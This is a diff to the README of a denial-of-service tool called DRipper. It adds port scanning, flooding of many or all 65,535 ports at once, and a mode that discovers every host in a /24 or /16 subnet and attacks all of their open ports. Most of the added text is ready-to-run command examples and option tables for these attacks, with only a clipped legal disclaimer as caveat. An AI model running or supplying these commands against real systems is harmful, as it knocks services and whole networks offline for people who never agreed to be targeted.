@@ -20,6 +20,9 @@ Unauthorized use of this tool may be illegal and could result in criminal prosec
 
 - 🚀 **High-Performance**: Socket-level HTTP requests for maximum throughput
 - 🔥 **Multiple Attack Modes**: Flood and Slowloris attacks
+- 🔍 **Port Scanning**: Scan and detect open ports on target IP
+- 🎯 **Multi-Port Attacks**: Attack multiple ports simultaneously
+- 🌐 **Network Attacks**: Attack all IPs in subnet and all their ports
 - 🎲 **Randomization**: User-agent rotation and random query parameters
 - 📊 **Real-Time Statistics**: Live updates during attack execution
 - 🔧 **Flexible Configuration**: Support for HTTP/HTTPS, custom ports, and headers
@@ -30,15 +33,14 @@ Unauthorized use of this tool may be illegal and could result in criminal prosec
 
 ### Prerequisites
 
-- Python 3.7 or higher
-- pip (Python package manager)
+- Python 3.7 or higher (no additional dependencies required!)
 
 ### Quick Install
 
 1. **Clone or download this repository**
    ```bash
-   git clone https://github.com/yourusername/DRipper.git
-   cd DRipper
+   git clone https://github.com/yourusername/ddos-ripper.git
+   cd ddos-ripper
    ```
 
 2. **Verify Python installation**
@@ -48,7 +50,7 @@ Unauthorized use of this tool may be illegal and could result in criminal prosec
    python --version
    ```
 
-3. **No additional dependencies required!** The tool uses only Python standard library.
+3. **That's it!** The tool uses only Python standard library - no installation needed.
 
 ## Quick Start
 
@@ -83,8 +85,20 @@ python3 DRipper.py -s <TARGET> -t <THREADS> [OPTIONS]
 
 | Option | Description | Default | Example |
 |--------|-------------|---------|---------|
-| `--threads` | `-t` | Number of concurrent threads | `135` | `-t 500` |
+| `--threads` | `-t` | Number of concurrent threads per port | `135` | `-t 500` |
 | `--mode` | Attack mode (flood/slowloris) | `flood` | `--mode slowloris` |
+| `--scan` | Scan all ports (1-65535) and attack detected ports | - | `--scan` |
+| `--scan-common` | Scan common ports only and attack detected ports | - | `--scan-common` |
+| `--scan-range` | Scan specific port range | - | `--scan-range 1 1000` |
+| `--ports` | Attack specific ports (comma-separated) | - | `--ports 80,443,8080` |
+| `--attack-all` | Attack all detected ports without prompting | - | `--attack-all` |
+| `--attack-all-ports` | Attack ALL ports (1-65535) simultaneously | - | `--attack-all-ports` |
+| `--attack-port-range` | Attack all ports in a range | - | `--attack-port-range 1 1000` |
+| `--attack-network` | Attack all IPs in subnet and all their ports | - | `--attack-network` |
+| `--subnet-mask` | Subnet mask for network scanning (default: 24) | `24` | `--subnet-mask 16` |
+| `--scan-timeout` | Port scan timeout in seconds | `3.0` | `--scan-timeout 5.0` |
+| `--scan-retries` | Number of retries per port | `2` | `--scan-retries 3` |
+| `--force-common-ports` | Force attack on common ports if scan fails | - | `--force-common-ports` |
 | `--help` | `-h` | Show help message | - | `-h` |
 
 ## Usage Examples
@@ -140,6 +154,200 @@ python3 DRipper.py -s https://api.example.com/endpoint -t 250
 # Maximum intensity test
 python3 DRipper.py -s https://example.com -t 2000
 ```
+
+### Port Scanning Examples
+
+#### 9. Scan All Ports and Attack Detected Ports
+```bash
+# Scan all ports (1-65535) and interactively select ports to attack
+python3 DRipper.py -s 192.168.1.1 --scan -t 200
+```
+
+#### 10. Scan Common Ports Only
+```bash
+# Scan common ports (21, 22, 80, 443, etc.) and attack detected ports
+python3 DRipper.py -s 192.168.1.1 --scan-common -t 200
+```
+
+#### 11. Scan Specific Port Range
+```bash
+# Scan ports 1-1000 and attack detected ports
+python3 DRipper.py -s 192.168.1.1 --scan-range 1 1000 -t 200
+```
+
+#### 12. Attack All Detected Ports Automatically
+```bash
+# Scan and attack all detected ports without prompting
+python3 DRipper.py -s 192.168.1.1 --scan-common --attack-all -t 200
+```
+
+#### 13. Attack Specific Ports
+```bash
+# Attack specific ports directly (no scanning)
+python3 DRipper.py -s 192.168.1.1 -t 200 --ports 80,443,8080
+```
+
+#### 14. Multi-Port Attack with Slowloris
+```bash
+# Scan common ports and attack with slowloris mode
+python3 DRipper.py -s 192.168.1.1 --scan-common --attack-all -t 300 --mode slowloris
+```
+
+#### 15. Attack ALL Ports (1-65535)
+```bash
+# Attack ALL 65,535 ports simultaneously (EXTREME - use with caution!)
+python3 DRipper.py -s 192.168.1.1 -t 10 --attack-all-ports
+
+# With more threads per port (WARNING: Very resource-intensive!)
+python3 DRipper.py -s 192.168.1.1 -t 50 --attack-all-ports
+```
+
+#### 16. Attack Port Range
+```bash
+# Attack all ports from 1 to 1000
+python3 DRipper.py -s 192.168.1.1 -t 100 --attack-port-range 1 1000
+
+# Attack ports 8000-9000
+python3 DRipper.py -s 192.168.1.1 -t 200 --attack-port-range 8000 9000
+```
+
+### Network Attack Examples
+
+#### 15. Attack All IPs in Subnet and All Their Ports
+```bash
+# Attack all IPs in the same subnet (/24) and all detected ports
+python3 DRipper.py -s 192.168.1.1 -t 200 --attack-network
+```
+
+#### 16. Network Attack with Custom Subnet Mask
+```bash
+# Attack all IPs in /16 subnet (larger network)
+python3 DRipper.py -s 192.168.1.1 -t 200 --attack-network --subnet-mask 16
+```
+
+#### 17. Network Attack with Slowloris
+```bash
+# Network attack using slowloris mode
+python3 DRipper.py -s 192.168.1.1 -t 300 --attack-network --mode slowloris
+```
+
+## Port Scanning
+
+The tool includes built-in port scanning capabilities to detect open ports on target IPs.
+
+### Scanning Options
+
+#### 1. Full Port Scan (`--scan`)
+- Scans all ports from 1 to 65535
+- Uses multi-threaded scanning for speed
+- Shows progress during scan
+- Interactive port selection after scan
+
+**Example:**
+```bash
+python3 DRipper.py -s 192.168.1.1 --scan -t 200
+```
+
+#### 2. Common Ports Scan (`--scan-common`)
+- Scans only common ports (21, 22, 23, 25, 53, 80, 110, 111, 135, 139, 143, 443, 445, 993, 995, 1723, 3306, 3389, 5900, 8080, 8443, 8888, 9000, 9090)
+- Much faster than full scan
+- Good for quick reconnaissance
+
+**Example:**
+```bash
+python3 DRipper.py -s 192.168.1.1 --scan-common -t 200
+```
+
+#### 3. Custom Range Scan (`--scan-range`)
+- Scan a specific port range
+- Useful for targeted scanning
+
+**Example:**
+```bash
+python3 DRipper.py -s 192.168.1.1 --scan-range 1 1000 -t 200
+```
+
+### Port Selection
+
+After scanning, you can:
+- **Select specific ports**: Enter port numbers separated by commas (e.g., `80,443,8080`)
+- **Attack all ports**: Enter `all` to attack all detected ports
+- **Quit**: Enter `q` to exit
+
+### Automatic Attack (`--attack-all`)
+
+Use `--attack-all` with scanning options to automatically attack all detected ports without prompting:
+
+```bash
+python3 DRipper.py -s 192.168.1.1 --scan-common --attack-all -t 200
+```
+
+### Direct Port Attack (`--ports`)
+
+Attack specific ports directly without scanning:
+
+```bash
+python3 DRipper.py -s 192.168.1.1 -t 200 --ports 80,443,8080
+```
+
+### Attack ALL Ports (`--attack-all-ports`)
+
+Attack ALL 65,535 ports simultaneously without scanning:
+
+**⚠️ WARNING: This is extremely resource-intensive!**
+- Creates attacks on every single port (1-65535)
+- Uses optimized worker pool for large port ranges
+- May overwhelm your system and network
+- Recommended to use low thread count (10-50)
+
+**Example:**
+```bash
+# Attack all ports with low thread count
+python3 DRipper.py -s 192.168.1.1 -t 10 --attack-all-ports
+
+# With more threads (WARNING: Very intensive!)
+python3 DRipper.py -s 192.168.1.1 -t 50 --attack-all-ports
+```
+
+### Attack Port Range (`--attack-port-range`)
+
+Attack all ports in a specific range:
+
+**Example:**
+```bash
+# Attack ports 1-1000
+python3 DRipper.py -s 192.168.1.1 -t 100 --attack-port-range 1 1000
+
+# Attack ports 8000-9000
+python3 DRipper.py -s 192.168.1.1 -t 200 --attack-port-range 8000 9000
+```
+
+### Network Attack (`--attack-network`)
+
+Attack all IPs in the same subnet and all their detected ports:
+
+**How it works:**
+1. Finds all IPs in the same subnet as the target IP (default: /24 subnet)
+2. Scans common ports on all those IPs
+3. Attacks all detected ports on all detected IPs simultaneously
+
+**Example:**
+```bash
+# Attack all IPs in /24 subnet (e.g., 192.168.1.0/24)
+python3 DRipper.py -s 192.168.1.1 -t 200 --attack-network
+
+# Attack with custom subnet mask (e.g., /16 for larger network)
+python3 DRipper.py -s 192.168.1.1 -t 200 --attack-network --subnet-mask 16
+```
+
+**Features:**
+- Automatically discovers all IPs in the subnet
+- Scans common ports on all IPs
+- Attacks all detected ports on all detected IPs
+- Warning prompt if more than 50 IPs found
+- Configurable subnet mask (default: /24)
+
+**Note:** This feature requires an IP address, not a hostname or URL.
 
 ## Attack Modes
 
@@ -370,7 +578,7 @@ python3 DRipper.py -s example.com -t 135
 ├── DRipper.py          # Main CLI tool
 ├── headers.txt         # Custom headers file (optional)
 ├── README.md          # This file
-└── requirements.txt   # Dependencies (none required)
+└── requirements.txt   # No dependencies (empty file)
 ```
 
 ## Examples Summary
@@ -390,6 +598,24 @@ python3 DRipper.py -s 192.168.1.1:8080 -t 200
 
 # Local testing
 python3 DRipper.py -s http://localhost:3000 -t 100
+
+# Port scanning and attack
+python3 DRipper.py -s 192.168.1.1 --scan-common -t 200
+
+# Attack all detected ports
+python3 DRipper.py -s 192.168.1.1 --scan-common --attack-all -t 200
+
+# Attack specific ports
+python3 DRipper.py -s 192.168.1.1 -t 200 --ports 80,443,8080
+
+# Attack ALL ports (1-65535) - EXTREME!
+python3 DRipper.py -s 192.168.1.1 -t 10 --attack-all-ports
+
+# Attack port range
+python3 DRipper.py -s 192.168.1.1 -t 100 --attack-port-range 1 1000
+
+# Attack all IPs in subnet and all their ports
+python3 DRipper.py -s 192.168.1.1 -t 200 --attack-network
 ```
 
 ## License
